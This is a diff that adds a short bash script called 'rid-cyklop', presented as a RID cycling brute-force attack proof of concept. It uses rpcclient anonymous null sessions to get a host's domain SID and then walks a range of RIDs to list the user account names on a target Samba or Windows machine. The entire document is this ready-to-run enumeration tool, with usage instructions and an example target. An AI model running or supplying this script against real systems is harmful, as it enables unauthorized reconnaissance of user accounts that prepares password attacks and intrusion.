@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# rid-cyklop   by 0bfxgh0st*
+# RID Cycling Bruteforce Attack (PoC) script based on rpcclient command (null session)
+
+COL_BLUE="\e[34m"
+COL_END="\e[0m"
+
+function GetUsers(){
+
+	if [ -z $1 ] || [ -z $2 ]|| [ -z $3 ];
+	then
+		printf "%s\n\n" "RID Cycling Bruteforce Attack (PoC)"
+		printf "%s\n" "Usage bash rid-cyklop <host> <start> <end>"
+		printf "%s\n" "Example bash rid-cyklop empire.vuln 0 700"
+		exit
+	fi
+
+	host=$1
+	start=$2
+	end=$3
+	name='root'
+
+	# trying get sid by lookupnames root user
+	get_sid=$(rpcclient -U "" "$host" -N -c "lookupnames $name" | awk '{print $2}')
+	if [ -z $get_sid ]
+	then
+		exit
+	fi
+	sid=$(echo ${get_sid:0:-1})
+
+	# catching no $name value user error, as | awk '{print $2}' is showing second column and cutting the rest of the output in this case corresponds to 'was' string
+	if [ $get_sid == 'was' ];
+	then
+		printf "%s\n" "Cannot find $name in lookupnames"
+		exit
+	fi
+
+	printf "${COL_BLUE}+${COL_END} Bruteforcing SIDs (from $sid$start to $sid$end)\n\n"
+	for ((n=$start;n<=$end;n++));
+	do
+		rpcclient -U "" "$host" -N -c "lookupsids $sid$n" | grep -oP 'User\\[a-z].*' | tr -d '(1)' | sed -e 's/User\\//g'
+	done
+
+}
+
+GetUsers $1 $2 $3 $4
